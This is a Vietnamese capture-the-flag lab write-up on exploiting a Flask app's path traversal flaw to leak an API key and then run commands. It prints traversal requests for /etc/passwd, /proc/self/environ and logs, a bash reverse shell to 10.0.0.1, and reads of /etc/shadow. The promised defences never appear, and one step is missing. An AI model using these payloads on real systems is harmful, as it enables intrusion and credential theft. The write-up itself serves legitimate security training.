<h3>Write-up Chuyên Sâu: Khai Thác Lỗ Hổng Hệ Thống Tập Tin Trên Linux
Giới Thiệu
Trong bài viết này, chúng ta sẽ đi sâu vào phân tích một lỗ hổng bảo mật nghiêm trọng trong ứng dụng web sử dụng Flask trên nền tảng Linux. Lỗ hổng kết hợp giữa khả năng đọc file tùy ý (Path Traversal) và thực thi lệnh từ xa (RCE) thông qua việc lộ API key trong biến môi trường. Bài viết sẽ trình bày chi tiết từng bước khai thác, kèm theo phân tích kỹ thuật sâu và các biện pháp phòng chống hiệu quả.<h3>

Phân Tích Ứng Dụng
1. Kiến Trúc Ứng Dụng
Ứng dụng được xây dựng bằng Python Flask với ba endpoint chính:

```/```: Trang chủ đơn giản

```/file```: Cho phép đọc nội dung file từ thư mục ./files/

```/admin```: Cho phép thực thi lệnh hệ thống khi cung cấp đúng API key

2. Mã Nguồn Quan Trọng
```
@app.route('/file', methods=['GET'])
def file():
    path = request.args.get('path', None)
    if path:
        data = open('./files/' + path).read()  # Lỗ hổng Path Traversal
        return data
    return 'Error !'

@app.route('/admin', methods=['GET'])
@key_required
def admin():
    cmd = request.args.get('cmd', None)
    if cmd:
        result = subprocess.getoutput(cmd)  # Lỗ hổng RCE
        return result
    return 'Error !'
```
Chi Tiết Lỗ Hổng
1. Path Traversal (CWE-22)
Nguyên nhân: Không kiểm tra input người dùng khi ghép vào đường dẫn file

Tác động: Đọc bất kỳ file nào hệ thống có quyền truy cập

Ví dụ khai thác:
```
GET /file?path=../../../../etc/passwd
```
2. RCE qua Biến Môi Trường
Cơ chế: API key được lưu trong biến môi trường và có thể bị lộ

Rủi ro: Kẻ tấn công có thể thực thi lệnh tùy ý khi có API key

Ví dụ:
```
GET /admin?API_KEY=xxx&cmd=id
```
Quy Trình Khai Thác Chi Tiết
Bước 1: Xác Định Lỗ Hổng Path Traversal
Thử đọc file hệ thống cơ bản:
```
GET /file?path=../../../../etc/passwd
```
Phân tích kết quả:

Thành công: Xác nhận lỗ hổng tồn tại

Thất bại: Có thể do filter hoặc sandbox

Bước 2: Tìm Kiếm Thông Tin Nhạy Cảm
Các vị trí quan trọng:

File log ứng dụng:
```
GET /file?path=../../../../var/log/app.log
```
File cấu hình nginx:
```
GET /file?path=../../../../etc/nginx/nginx.conf
```
Biến môi trường tiến trình:
```
GET /file?path=../../../../proc/self/environ
```
Bước 3: Khai Thác Lộ API Key
Phân tích file log nginx tìm request chứa API key:
```
GET /file?path=../../../../var/log/nginx/access.log
```
Nâng cấp quyền hạn:
```
GET /admin?API_KEY=SECRET_KEY&cmd=sudo+-l
```
Bước 5: Chiếm Quyền Hệ Thống
Tạo reverse shell:
```
GET /admin?API_KEY=SECRET_KEY&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261"
```
Khai thác sâu hơn:

Đọc file shadow:
```
GET /admin?API_KEY=SECRET_KEY&cmd=cat+/etc/shadow
```
Tìm kiếm file flag:
```
GET /admin?API_KEY=SECRET_KEY&cmd=find+/+-name+"*flag*"
```
Phân Tích Nâng Cao
1. Kỹ Thuật Bypass Filter
Sử dụng encoding:
```
GET /file?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
Đọc trực tiếp:
```
GET /file?path=../../../../proc/self/environ
```
Kết Luận
Qua bài lab này, chúng ta đã học được:

Cách khai thác lỗ hổng Path Traversal để leo thang đặc quyền

Kỹ thuật tìm kiếm thông tin nhạy cảm trong hệ thống Linux

Phương pháp phòng chống các lỗ hổng tương tự

Flag thu được: DH{2a4ff4e94d09793c662d1bd7ec5d497d7b190c6f}

Hãy luôn nhớ: "Security is a process, not a product" - Bruce Schneier. Việc hiểu rõ các lỗ hổng và cách phòng chống sẽ giúp chúng ta xây dựng hệ thống an toàn hơn.


